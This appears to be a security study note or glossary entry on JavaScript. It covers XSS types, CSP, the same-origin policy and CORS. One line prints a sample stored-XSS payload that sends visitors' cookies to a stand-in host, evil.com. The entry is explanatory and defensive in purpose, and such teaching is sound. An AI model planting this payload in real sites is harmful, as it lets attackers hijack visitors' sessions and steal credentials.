# JavaScript

## What it is
Think of a web page as a stage set — HTML is the scenery, CSS is the paint, and JavaScript is the actor who moves around, reacts to the audience, and can hand objects to people in the crowd. Precisely, JavaScript is a client-side scripting language executed by the browser that enables dynamic, interactive web content and can manipulate the DOM, make network requests, and access browser APIs in real time.

## Why it matters
JavaScript is the primary weapon in Cross-Site Scripting (XSS) attacks — an attacker who injects malicious JS into a vulnerable website can silently steal session cookies from every visitor, effectively hijacking their authenticated sessions without touching the server. For example, a stored XSS payload like `<script>document.location='https://evil.com/?c='+document.cookie</script>` harvests credentials at scale.

## Key facts
- **XSS** (Cross-Site Scripting) is the #1 JavaScript-related vulnerability; it comes in three types: Stored, Reflected, and DOM-based
- JavaScript can be used to bypass client-side input validation — **never trust client-side controls** as a security boundary
- **Content Security Policy (CSP)** headers are the primary defense mechanism against malicious JS execution, restricting which scripts can run
- JavaScript runs in the browser's **same-origin policy (SOP)** sandbox, which restricts cross-domain data access — CORS misconfigurations break this protection
- Malicious JS can perform **clickjacking**, **credential harvesting**, **keylogging**, and **cryptomining** entirely within the victim's browser

## Related concepts
[[Cross-Site Scripting (XSS)]] [[Content Security Policy]] [[Same-Origin Policy]] [[DOM Manipulation]] [[Cross-Origin Resource Sharing (CORS)]]